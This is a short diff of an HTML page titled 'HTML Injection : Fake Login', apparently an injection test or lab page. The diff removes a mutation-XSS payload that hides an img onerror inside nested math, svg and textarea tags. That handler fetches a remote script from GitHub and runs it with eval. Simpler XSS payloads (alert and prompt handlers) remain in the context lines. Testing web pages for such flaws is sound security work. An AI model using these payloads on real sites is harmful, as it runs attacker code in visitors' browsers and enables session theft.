@@ -6,7 +6,6 @@ info:
     <div class="heading">
         <h1>HTML Injection : Fake Login</h1>
     </div>
-    <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/alex0x3/XSS-test/refs/heads/main/script.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
     <i>test</i><img src=x onerror=alert(1)>
     <svg onload=prompt(1)>
     <div class="form-container">
